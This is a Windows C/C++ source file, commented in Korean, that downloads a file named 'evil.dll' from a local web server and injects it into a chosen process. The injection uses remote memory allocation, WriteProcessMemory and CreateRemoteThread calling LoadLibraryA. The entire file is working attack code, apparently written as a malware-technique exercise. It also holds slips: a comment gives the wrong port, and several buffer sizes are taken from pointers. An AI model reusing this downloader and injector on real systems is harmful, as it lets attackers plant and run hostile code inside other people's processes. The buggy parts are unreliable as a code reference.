#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <TCHAR.H>
#pragma comment (lib, "wininet.lib")

char evilDLL[] = "C:\\Temp\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;


// 해당 url(localhost 4444)로부터 evil.dll 다운로드한다.
char* getEvil() {
    HINTERNET hSession = InternetOpen("localhost", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    printf("%d \n", hSession);
    HINTERNET hHttpFile = InternetOpenUrl(hSession, "http://127.0.0.1:8080/evil.dll", NULL, 0, 0, 0);
    printf("%d \n", hHttpFile);
    DWORD dwFileSize = 1024;
    char* buffer = new char[dwFileSize + 1];
    DWORD dwBytesRead;
    DWORD dwBytesWritten;

    // InternelOpenUrl 함수 실패 시에도 무한 루프에 빠지지 않도록
    TCHAR *szStatusCode = (TCHAR*)malloc(10000); 
    DWORD dwInfoSize = sizeof(szStatusCode); 
    HttpQueryInfo(hHttpFile, HTTP_QUERY_STATUS_CODE, szStatusCode, &dwInfoSize, NULL);
    long nStatusCode = _ttol(szStatusCode);

    if (nStatusCode == HTTP_STATUS_OK) {
        HANDLE hFile = CreateFile("C:\\Temp\\evil.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        do {
            buffer = new char[dwFileSize + 1];
            ZeroMemory(buffer, sizeof(buffer));
            InternetReadFile(hHttpFile, (LPVOID)buffer, sizeof(buffer), &dwBytesRead);
            WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);
            delete[] buffer;
            buffer = NULL;
        } while (dwBytesRead > 0);
        CloseHandle(hFile);
    }

    InternetCloseHandle(hHttpFile);
    InternetCloseHandle(hSession);
    return buffer;
}

int main(int argc, char* argv[]) {
    HANDLE ph; 
    HANDLE rt; 
    LPVOID rb; // remote buffer

    // 항상 하던 그것 Kernel32 모듈에서 LoadLibraryA함수 주소 얻어오기.
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID* lb = GetProcAddress(hKernel32, "LoadLibraryA");
    char* evil = getEvil();
    // PID
    if (atoi(argv[1]) == 0) {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i\n", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    // 원격 프로세스를 위해 메모리 버퍼 할당
    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    // 새 스레드 시작
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    CloseHandle(ph);
    return 0;
}